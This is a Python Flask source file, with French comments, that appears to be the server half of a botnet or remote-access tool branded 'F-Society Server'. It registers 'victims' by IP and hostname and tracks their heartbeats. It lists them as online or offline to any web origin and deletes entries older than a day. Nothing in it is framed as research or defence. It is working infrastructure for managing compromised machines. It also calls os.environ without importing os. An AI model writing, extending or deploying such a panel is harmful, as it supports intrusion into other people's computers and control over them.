from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timezone
import time

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})  # CORS plus permissif

# Stockage en mémoire
victims = {}

@app.route('/')
def home():
    return jsonify({"status": "online", "message": "F-Society Server Active"})

@app.route('/register', methods=['POST', 'GET'])
def register():
    if request.method == 'GET':
        return jsonify({"error": "Use POST method"}), 400
    
    try:
        data = request.get_json()
        
        # Fallback si pas de JSON
        if not data:
            ip = request.remote_addr
            hostname = request.headers.get('User-Agent', 'Unknown')
        else:
            ip = data.get('ip', request.remote_addr)
            hostname = data.get('hostname', 'Unknown PC')
        
        # Nettoyage des données
        if ip == "127.0.0.1 (Local/Error)":
            ip = request.remote_addr
        
        victim_id = f"{ip}_{hostname}"
        
        victims[victim_id] = {
            'id': victim_id,
            'ip': ip,
            'hostname': hostname,
            'last_seen': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            'status': 'online'
        }
        
        print(f"[+] Victim: {hostname} ({ip})")
        
        # Cleanup des vieilles entrées (> 24h)
        cleanup_old_victims()
        
        return jsonify({'status': 'ok', 'id': victim_id})
    
    except Exception as e:
        print(f"[-] Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/victims', methods=['GET'])
def get_victims():
    try:
        # Vérification heartbeat (5 minutes max)
        now = datetime.now(timezone.utc)
        active_victims = []
        
        for vid, info in victims.items():
            last_seen_str = info['last_seen']
            # Conversion simple
            if 'UTC' in last_seen_str:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
            else:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
            
            # Différence en minutes
            diff_minutes = (now - last_seen).total_seconds() / 60
            
            if diff_minutes > 5:
                info['status'] = 'offline'
            else:
                info['status'] = 'online'
            
            active_victims.append(info)
        
        return jsonify(active_victims)
    
    except Exception as e:
        print(f"[-] Get victims error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def cleanup_old_victims():
    """Supprime les victimes de plus de 24h"""
    try:
        now = datetime.now(timezone.utc)
        to_delete = []
        
        for vid, info in victims.items():
            last_seen_str = info['last_seen']
            if 'UTC' in last_seen_str:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
            else:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
            
            diff_hours = (now - last_seen).total_seconds() / 3600
            
            if diff_hours > 24:
                to_delete.append(vid)
        
        for vid in to_delete:
            del victims[vid]
            print(f"[!] Removed old victim: {vid}")
    
    except Exception as e:
        print(f"[-] Cleanup error: {e}")

@app.route('/health', methods=['GET'])
def health_check():
    """Endpoint pour vérifier que le serveur fonctionne"""
    return jsonify({
        "status": "healthy",
        "victims_count": len(victims),
        "timestamp": datetime.now(timezone.utc).isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
